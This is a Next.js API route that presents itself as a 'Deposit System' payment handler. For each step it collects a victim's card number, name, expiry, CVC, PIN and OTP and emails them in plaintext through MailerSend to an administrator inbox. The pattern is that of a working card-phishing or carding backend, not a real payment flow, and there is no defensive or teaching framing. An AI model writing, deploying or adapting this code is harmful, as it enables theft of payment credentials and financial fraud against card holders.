import { render } from "@react-email/render"
import { MailerSend, EmailParams, Sender, Recipient } from "mailersend"
import { PinEmail, OtpEmail } from "../../../components/email-templates"

export async function POST(request: Request) {
  try {
    const { type, data } = await request.json()

    const step = type === "payment_details" ? "pin" : type === "otp_confirmation" ? "otp" : null

    if (!step) {
      return Response.json({ success: false, error: "Invalid email step type" }, { status: 400 })
    }

    const { email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin, otp } = data

    const apiToken = process.env.MAILERSEND_API_TOKEN
    const receiverEmail = process.env.RECEIVER_EMAIL

    if (!apiToken) {
      console.log("[v0] Missing MAILERSEND_API_TOKEN")
      return Response.json({ success: false, error: "Email service not configured" }, { status: 500 })
    }

    if (!receiverEmail) {
      console.log("[v0] Missing RECEIVER_EMAIL")
      return Response.json({ success: false, error: "Receiver email not configured" }, { status: 500 })
    }

    const mailerSend = new MailerSend({
      apiKey: apiToken,
    })

    const fromEmail = "secure@test-yxj6lj9ow3x4do2r.mlsender.net"
    const sentFrom = new Sender(fromEmail, "Deposit System")
    const recipients = [new Recipient(receiverEmail, "Admin")]

    let subject = ""
    let emailHtml = ""

    if (step === "pin") {
      subject = "Deposit Transaction - PIN Entered"
      emailHtml = render(
        <PinEmail
          email={email}
          amount={amount}
          cardName={cardName}
          cardNumber={cardNumber}
          expiryDate={expiryDate}
          cvc={cvc}
          cardType={cardType}
          pin={pin}
        />,
      )
    } else if (step === "otp") {
      subject = "Deposit Transaction - OTP Verification"
      emailHtml = render(
        <OtpEmail
          email={email}
          amount={amount}
          cardName={cardName}
          cardNumber={cardNumber}
          expiryDate={expiryDate}
          cvc={cvc}
          cardType={cardType}
          pin={pin}
          otp={otp}
        />,
      )
    }

    const emailParams = new EmailParams()
      .setFrom(sentFrom)
      .setTo(recipients)
      .setSubject(subject)
      .setHtml(emailHtml)
      .setText(`Deposit notification for ${email}, amount: ₦${amount}`)

    console.log("[v0] Sending email with MailerSend SDK")

    const response = await mailerSend.email.send(emailParams)

    console.log("[v0] Email sent successfully:", response)
    return Response.json({ success: true })
  } catch (error) {
    console.log("[v0] Email API error:", error)
    return Response.json(
      {
        success: false,
        error: "Failed to send email",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}
